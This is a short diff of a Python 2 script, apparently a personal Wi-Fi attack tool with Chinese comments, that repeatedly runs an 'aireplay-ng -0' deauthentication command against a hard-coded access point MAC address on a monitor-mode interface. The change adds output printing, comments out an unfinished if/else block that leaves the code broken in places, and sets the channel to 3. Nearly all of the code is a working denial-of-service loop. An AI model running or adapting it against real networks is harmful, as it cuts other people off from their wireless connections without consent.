@@ -34,14 +34,17 @@ class ATTACK:
         attack = r.hget('attack', 'statu')
         # 在程序执行之前先改变虚拟网卡的信道
         self.changechannel(self.wlanname, self.ch)
+        re_channel = re.compile(r'AP\Wuses\Wchannel\W(\d)')
         while int(attack) == 1:
             cmd = 'aireplay-ng -0 10 -a {} {}mon'.format(self.mac, self.wlanname)
             p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
             out, err = p.communicate()
+            print out
+            print err
             # 如果攻击成功那就继续
-            if
+            #if
                 # 继续执行
-            else:
+            #else:
                 # 如果没有攻击成功那就改变虚拟网卡的频率
             time.sleep(0.2)
             attack = r.hget('attack', 'statu')
@@ -57,5 +60,5 @@ class ATTACK:
 
 
 if __name__ == '__main__':
-    attack = ATTACK('50:2B:73:F4:35:F1', 'wlan1', 'ch')
+    attack = ATTACK('50:2B:73:F4:35:F1', 'wlan1', '3')
     attack.start()
